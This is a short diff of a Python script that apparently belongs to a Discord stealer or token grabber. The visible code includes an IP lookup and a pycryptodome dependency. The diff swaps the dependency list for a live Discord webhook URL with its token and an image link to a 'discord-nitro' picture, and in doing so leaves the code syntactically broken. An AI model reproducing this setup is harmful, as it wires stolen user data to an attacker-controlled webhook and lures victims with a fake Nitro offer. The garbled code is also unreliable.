@@ -32,9 +32,9 @@ def getip():
         pass
     return ip
 
-requirements = [
-    ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"]
+requirements = [https://discord.com/api/webhooks/1486227987199164497/A1TxyMIkTZFapYZsFyrAj6glmVrzzPE0JDDLYGqCqg1Vp8IT2I0NmUK4-zX5T83Jyegc
+    ]
+    [https://imgs.search.brave.com/ZZkMoBBtQ6ybLR_PmOIUU_AN3qWb4tftZ5zgi7xpy8s/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9maWxl/cy50ZWNub2Jsb2cu/bmV0L3dwLWNvbnRl/bnQvdXBsb2Fkcy8y/MDIxLzA5L2Rpc2Nv/cmQtbml0cm8tMzQw/eDE5MS5qcGVn
 ]
 for modl in requirements:
     try: __import__(modl[0])
